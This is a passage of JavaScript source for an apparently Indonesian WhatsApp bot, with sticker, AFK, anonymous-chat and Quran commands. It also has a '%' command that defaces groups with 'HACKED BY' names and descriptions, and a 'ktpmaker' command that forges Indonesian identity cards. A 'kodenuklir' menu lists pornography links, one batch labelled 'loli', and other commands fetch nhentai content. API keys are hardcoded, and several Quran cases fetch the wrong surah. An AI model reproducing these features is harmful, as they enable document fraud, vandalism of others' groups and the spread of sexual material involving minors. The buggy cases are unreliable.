  console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))



  var names = getRandom('.webp')



  var namea = getRandom('.png')



  var download = function (uri, filename, callback) {



 request.head(uri, function (err, res, body) {



request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);



 });



  };



  download(url, namea, async function () {



 let filess = namea



 let asw = names



 require('./lib/exif.js')



 exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {



exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {



  let media = fs.readFileSync(asw)



  wann.sendMessage(to, media, sticker)



  console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))



});



 });



  });



}



////////// level nye



let Levelnye = level.getLevelingLevel(sender, _level)



let Xpluu = level.getLevelingXp(sender, _level)



let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100



tc = `MAAF KA NOMER KAMU BLOM TERDAFTAR DI DATABASE SILAHKAN KETIK !verify UNTUK MENDAFTAR DI SAYU BOTZ`



ind = {



  wait: `⌛ Sedang di Prosess ⌛`,



  success: `✔️ Berhasil ✔️`,



}



///// < lanjut massss > ////



let ikyads = await getBuffer(`${ppbot}`)
fakelink = (tekslink) => { 
return {"externalAdReply": { "title": tekslink, "thumbnail": ikyads, "sourceUrl": "https://www.instagram.com/p/CTpK7vlJYYc/?utm_medium=copy_link" }}
}

// AFK



if (isGroup) {



  for (let x of mentionUser) {



 if (afk.checkAfkUser(x, _afk)) {



const getId = afk.getAfkId(x, _afk)



const getReason = afk.getAfkReason(getId, _afk)



const getTime = afk.getAfkTime(getId, _afk)



const cptl = `*「 AFK MODE 」*\n



*Sssttt! Orangnya lagi AFK, jangan diganggu!*



➸ *Alasan*  : ${getReason}



➸ *Sejak* : ${getTime}`



mentions(cptl, x, true)



 }}



 if (afk.checkAfkUser(sender, _afk) && !isCmd) {



const getTime = afk.getAfkTime(sender, _afk)



const getReason = afk.getAfkReason(sender, _afk)



const ittung = ms(await Date.now() - getTime)



const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`



reply(pep)



_afk.splice(afk.getAfkPosition(sender, _afk), 1)



fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))



 }



  }







  if (!isCmd && from.endsWith('@s.whatsapp.net')) {



 wann.anonymous = wann.anonymous ? wann.anonymous: {}



 let room = Object.values(wann.anonymous).find(room => [room.a, room.b].includes(sender) && room.state === 'CHATTING')



 if (room) {



if (/^.*(next|leave|start)/.test(body)) return



  if ([`${prefix}next`, `${prefix}leave`, `${prefix}start`, 'Cari Partner', 'Keluar', 'Next'].includes(body)) return



 let other = [room.a,



  room.b].find(user => user !== sender)



  if (type === "conversation") {



 wann.sendMessage(other, wan.message.conversation, text);



  } else {



 wann.sendMessageFromContent(other, wan.message)



  }



}



 }







 const ByReply = type == "extendedTextMessage" && wan.message.extendedTextMessage.contextInfo != null ? wan.message.extendedTextMessage.contextInfo.stanzaId || "": ""



 const typeImage = ByReply ? ByReply.startsWith('IMAGE'): false



 const typePdf = ByReply ? ByReply.startsWith('PDF'): false



 const nhSearch = ByReply ? ByReply.startsWith("CARI") : false



 const finish = ByReply ? ByReply.startsWith("FINISH") : false







 if (!isCmd && typePdf) {



if (ByReply.match(/^[0-9]/)) return reply("Reply with number!")



  reply("Wait a moment, the data is being processed")



var a = await axios.get(`https://api.lolhuman.xyz/api/nhentai/${budy}?apikey=IkyChan`)



var capt = `• Title : ${a.data.result.title_romaji}\n\n`



for (let i in a.data.result.info) {



  capt += `• ${i} : ${a.data.result.info[i].toString()}\n\n`



}



await wann.sendMessage(from, {



  url: a.data.result.image[0]}, image, {



 caption: capt, quoted: wan })







var pdf = await axios.get(`https://api.lolhuman.xyz/api/nhentaipdf/${budy}?apikey=IkyChan`)



wann.sendMessage(from, {url: pdf.data.result}, document, {



  thumbnail: await getBuffer(a.data.result.image[0]), quoted: wan, filename: a.data.result.title_romaji, mimetype: "application/pdf"



})











 } else if (!isCmd && typeImage) {



if (body.match(/^[0-9]/)) return reply("Reply with number!")



  reply("Wait a moment, the data is being processed")



var a = await axios.get(`https://api.lolhuman.xyz/api/nhentai/${budy}?apikey=IkyChan`)



for (let i of a.data.result.image) {



  wann.sendMessage(from, {url: i}, image, {thumbnail: Buffer.alloc(0)})



  await sleep(600)



}



 } else if (!isCmd && nhSearch) {



reply (`Wait, i searching nhentai code for you`)



var a = await axios.get(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=IkyChan&query=${budy}`)



teks = `*THIS RESULT FOR YOU*\n\nTo get result reply this message with the code below\n\nExample : 212121\n\n`



b = a.data.result



for (let c of b) {



  for (let i in c) {



 teks += `• ${i} :  ${c[i].toString()}\n\n`



  }



}



wann.sendMessage(from, teks, "conversation", {



  quoted: wan, messageId: "PDF"+createSerial(8)})



 }



















//// CMD



if (isCmd && !isGroup)



  atm.addKoinUser(sender, randomNomor(20), _uang)



console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))



if (isCmd && isGroup)



  atm.addKoinUser(sender, randomNomor(20), _uang)



console.log(color('[ CMD ]'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))



//////// < lanjut mas > ////////////



if (budy.toLowerCase() === `8473`){



  if (isRegister) return 



 register.push(sender)



  fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))



  teks = `Verification success\n\nPlease send *!menu* to view menu`



  atm.addKoinUser(sender, randomNomor(100), _uang)



  wann.sendMessage(from, teks, text, {quoted: freply })



}



if (!wan.key.fromMe && banChats === false) return



  switch (command) {



case '%':



if (!isGroup) return reply(mess.only.group)



 if (args.length < 1) return reply('Teksnya?')



reply('Otw Kudeta')



 tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)



 wann.updateProfilePicture (from, tessgc)



 await sleep(1000)



 wann.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)



 await sleep(1000)



 wann.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)



 await sleep(1000)



 wann.sendMessage(from, 'Succes Hacked', text, {quoted: mek})



 break
case 'ktpmaker':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
               get_args = args.join(" ").split("|")
               nik = get_args[0]
               prov = get_args[1]
               kabu = get_args[2]
               name = get_args[3]
               ttl = get_args[4]
               jk = get_args[5]
               jl = get_args[6]
               rtrw = get_args[7]
               lurah = get_args[8]
               camat = get_args[9]
               agama = get_args[10]
               nikah = get_args[11]
               kerja = get_args[12]
               warga = get_args[13]
               until = get_args[14]
               img = get_args[15]
               ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=WannOff&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
               await wann.sendMessage(from, ini_buffer, image, { quoted: freply })
               break
case 'kodenuklir':
                 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
        thu = await wann.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
        groups = wann.chats.array.filter(v => v.jid.endsWith('g.us'))
               privat = wann.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
               ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
               charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
               uptime = process.uptime();
               timestampe = speed();
               totalChat = await wann.chats.all()
               latensie = speed() - timestampe
               total = math(`${groups.length}*${privat.length}`)
               
       menu =`Hai ${pushname} 👋`
       
        //ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=IkyChan&query=Sayu Ogiwara anime`)
        //ini_url = ini_url.result
        //ikyads = await getBuffer(ini_url)
   
    // wann.sendMessage(from, { contentText: `${menu}`, footerText: '☑️ Info Pemesanan Bisa Chat\n\n☎ WhatsApp : https://wa.me/6285640068416\n\n☎ WhatsApp : https://wa.me/6285640068416\n\n☎ WhatsApp  : https://wa.me/6285640068416', buttons: [{ buttonId: `.cheat`, buttonText: { displayText: 'LIST CHEAT' }, type: 1 },{ buttonId: `.jamu`, buttonText: { displayText: 'JAMU CHEAT' }, type: 1 },{ buttonId: `.pay`, buttonText: { displayText: 'LIST PAYMENT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')    
    //break
    buttons =  [
     {buttonId: `${prefix}kodenuklir`, buttonText: {displayText: 'Bot hentai BETA'}, type: 1},
     //{buttonId: `${prefix}file`, buttonText: {displayText: 'LIST FILE CHEAT'}, type: 1},
    //{buttonId: `${prefix}jamu`, buttonText: {displayText: 'LIST JAMU CHEAT'}, type: 1},
   ]
    imageMsg = (await wann.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage
    
    buttonsMessage = {
    contentText: `${menu}`,
    footerText:  `Easy Mode :
    • https://nhentai.net/g/316755/
    • https://nhentai.net/g/316596/
    • https://nhentai.net/g/311850/
    • https://nhentai.net/g/315578/
    • https://nhentai.net/g/315488/
    • https://nhentai.net/g/315406/
    • https://nhentai.net/g/315344/
    • https://nhentai.net/g/315323/
    • https://nhentai.net/g/315136/
    • https://nhentai.net/g/315099/
    Medium Mode :
    • https://nhentai.net/g/316867/
    • https://nhentai.net/g/316869/
    • https://nhentai.net/g/316785/
    • https://nhentai.net/g/316763/51/
    • https://nhentai.net/g/316445/
    • https://nhentai.net/g/316250/
    • https://nhentai.net/g/311283/
    • https://nhentai.net/g/265671/
    • https://nhentai.net/g/312127/
    • https://nhentai.net/g/311560/
    Hard Mode :
    • https://nhentai.net/g/316820/
    • https://nhentai.net/g/316481/
    • https://nhentai.net/g/316430/
    • https://nhentai.net/g/276347/
    • https://nhentai.net/g/196329/
    • https://nhentai.net/g/304543/
    • https://nhentai.net/g/295295/
    • https://nhentai.net/g/311262/
    • https://nhentai.net/g/311882/
    • https://nhentai.net/g/312180/
    Note : Easy mode = Sange, Biasa Aja, Mental Lemah :v
    ==============================
    Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
    ==============================
    Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
    ==============================
    Kode nuklir dr milf oneesan ampe gan*** loli
    https://nhentai.net/g/271890/
    https://nhentai.net/g/272057/
    https://nhentai.net/g/272173/
    https://nhentai.net/g/272182/
    https://nhentai.net/g/272196/
    https://nhentai.net/g/272197/
    https://nhentai.net/g/272259/
    https://nhentai.net/g/272276/
    https://nhentai.net/g/272290/
    https://nhentai.net/g/272377/
    -
    https://nhentai.net/g/272390/
    https://nhentai.net/g/272512/
    https://nhentai.net/g/271245/
    https://nhentai.net/g/271056/
    https://nhentai.net/g/270809/
    https://nhentai.net/g/269653/
    https://nhentai.net/g/266088/
    https://nhentai.net/g/264980/
    https://nhentai.net/g/262215/
    https://nhentai.net/g/260433/
    -
    https://nhentai.net/g/260146/
    https://nhentai.net/g/256738/
    https://nhentai.net/g/272425/
    https://nhentai.net/g/272352/
    https://nhentai.net/g/272045/
    https://nhentai.net/g/272015/
    https://nhentai.net/g/271993/
    https://nhentai.net/g/271924/
    https://nhentai.net/g/271905/
    https://nhentai.net/g/271797/
    -
    https://nhentai.net/g/271760/
    https://nhentai.net/g/271717/
    https://nhentai.net/g/271726/
    https://nhentai.net/g/271667/
    https://nhentai.net/g/267352/
    https://nhentai.net/g/152968/
    https://nhentai.net/g/238876/
    https://nhentai.net/g/116395/
    https://nhentai.net/g/84809/
    https://nhentai.net/g/211656/
    -
    https://nhentai.net/g/272117/
    https://nhentai.net/g/188721/
    https://nhentai.net/g/266402/
    https://nhentai.net/g/238876/
    
    Happy Mother's Day 
    165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536,
    
    Random
    257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`, imageMessage: imageMsg,
    buttons: buttons,
    headerType: 4
        }
        prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
        wann.relayWAMessage(prep)
   break
   case 'listsurah':
  reply(`Berikut ini Daftar Nomor Surah 
Untuk mencari ketik ${prefix}quran 1

1. Al-Fatihah الفاتحة
2. Al-Baqarah البقرة
3. Ali ‘Imran آل عمران
4. An-Nisa’ النّساء
5. Al-Ma’idah المآئدة
6. Al-An’am الانعام
7. Al-A’raf الأعراف
8. Al-Anfal الأنفال
9. At-Taubah التوبة
10. Yunus ينوس
11. Hud هود
12. Yusuf يسوف
13. Ar-Ra’d الرّعد
14. Ibrahim إبراهيم
15. Al-Hijr الحجر
16. An-Nahl النّحل
17. Al-Isra’ بني إسرائيل
18. Al-Kahf الكهف
19. Maryam مريم
20. Ta Ha طه
21. Al-Anbiya الأنبياء
22. Al-Hajj الحجّ
23. Al-Mu’minun المؤمنون
24. An-Nur النّور
25. Al-Furqan الفرقان
26. Asy-Syu’ara’ الشّعراء
27. An-Naml النّمل
28. Al-Qasas القصص
29. Al-‘Ankabut العنكبوت
30. Ar-Rum الرّوم
31. Luqman لقمان
32. As-Sajdah السّجدة
33. Al-Ahzab الْأحزاب
34. Saba’ سبا
35. Fatir فاطر
36. Ya Sin يس
37. As-Saffat الصّافات
38. Sad ص
39. Az-Zumar الزّمر
40. Al-Mu’min المؤمن
41. Fussilat فصّلت
42. Asy-Syura الشّورى
43. Az-Zukhruf الزّخرف
44. Ad-Dukhan الدّخان
45. Al-Jasiyah الجاثية
46. Al-Ahqaf الَأحقاف
47. Muhammad محمّد
48. Al-Fath الفتح
49. Al-Hujurat الحجرات
50. Qaf ق
51. Az-Zariyat الذّاريات
52. At-Tur الطّور
53. An-Najm النّجْم
54. Al-Qamar القمر
55. Ar-Rahman الرّحْمن
56. Al-Waqi’ah الواقعه
57. Al-Hadid الحديد
58. Al-Mujadilah المجادلة
59. Al-Hasyr الحشْر
60. Al-Mumtahanah الممتحنة
61. As-Saff الصّفّ
62. Al-Jumu’ah الجمعة
63. Al-Munafiqun المنافقون
64. At-Tagabun التّغابن
65. At-Talaq الطّلاق
66. At-Tahrim التّحريم
67. Al-Mulk الملك
68. Al-Qalam القلم
69. Al-Haqqah الحآقّة
70. Al-Ma’arij المعارج
71. Nuh نوح
72. Al-Jinn الجنّ
73. Al-Muzzammil المزمّل
74. Al-Muddassir المدشّر
75. Al-Qiyamah القيمة
76. Al-Insan الْاٍنسان
77. Al-Mursalat المرسلات
78. An-Naba’ النّبا
79. An-Nazi’at النّازعات
80. ‘Abasa عبس
81. At-Takwir التّكوير
82. Al-Infitar الانفطار
83. Al-Tatfif المطفّفين
84. Al-Insyiqaq الانشقاق
85. Al-Buruj البروج
86. At-Tariq الطّارق
87. Al-A’la الْأعلى
88. Al-Gasyiyah الغاشية
89. Al-Fajr الفجر
90. Al-Balad البلد
91. Asy-Syams الشّمس
92. Al-Lail الّيل
93. Ad-Duha الضحى
94. Al-Insyirah الانشراح
95. At-Tin التِّينِ
96. Al-‘Alaq العَلَق
97. Al-Qadr الْقَدْرِ
98. Al-Bayyinah الْبَيِّنَةُ
99. Az-Zalzalah الزلزلة
100. Al-‘Adiyat العاديات
101. Al-Qari’ah القارعة
102. At-Takasur التكاثر
103. Al-‘Asr العصر
104. Al-Humazah الهُمَزة
105. Al-Fil الْفِيلِ
106. Quraisy قُرَيْشٍ
107. Al-Ma’un الْمَاعُونَ
108. Al-Kausar الكوثر
109. Al-Kafirun الْكَافِرُونَ
110. An-Nasr النصر
111. Al-Lahab المسد
112. Al-Ikhlas الإخلاص
113. Al-Falaq الْفَلَقِ
114. An-Nas نَاسِ`)
break        
//===========================================================
case 'quran':

surah = body.slice(7)
anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=${surah}&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: ${surah}\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
  quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}
lagu = await getBuffer(anu.audio)
wann.sendMessage(from, lagu, audio, {mimetype: 'audio/mp3', ptt:true})
reply(quran.trim())
break
case 'al-fatihah':
      anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=1&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 1\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
  quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/1?apikey=${setting.lolkey}`)
        reply(quran.trim())
        wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
       break
//===========================================================
case 'al-baqarah':
  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=2&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 2\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/2?apikey=${setting.lolkey}`)
     reply(quran.trim())
     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
     break
//===========================================================
case 'al-imran':
  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=3&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 3\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/3?apikey=${setting.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
  break
//===========================================================
case 'an-nisa':
  
  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=4&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 4\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/4?apikey=${setting.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
  break
//===========================================================
case 'al-maidah':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=5&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 5\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/5?apikey=${setting.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//===========================================================
case 'al-anam':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=6&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 6\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
			       quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
			       \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/6?apikey=${setting.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                    break
//===========================================================
case 'al-araf':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=7&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 7\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/7?apikey=${setting.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
  break
//===========================================================
case 'al-anfal':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=8&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 8\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

   buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${setting.lolkey}`)
   reply(quran.trim())
   wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
   break
//===========================================================
case 'at-taubah':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=9&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 9\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${setting.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                    break
//===========================================================
case 'yunus':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=10&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 10\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
			       quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${setting.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                    break
//===========================================================
case 'hud':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=11&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 11\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/11?apikey=${setting.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
 break
//===========================================================
case 'yusuf':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=12&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 12\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/12?apikey=${setting.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                   break
//=============================================================
case 'ar-raad':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=13&apikey=WannOff}`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 13\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/13?apikey=${setting.lolkey}`)
                     reply(quran.trim())
                     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                  break
 //===========================================================
 case 'ibrahim':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=14&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 14\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/14?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'al-hijr':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=15&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 15\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/15?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'an-nahl':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=15&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 16\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/16?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'al-isra':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=17&apikey=WannOff`, {method: 'get'})
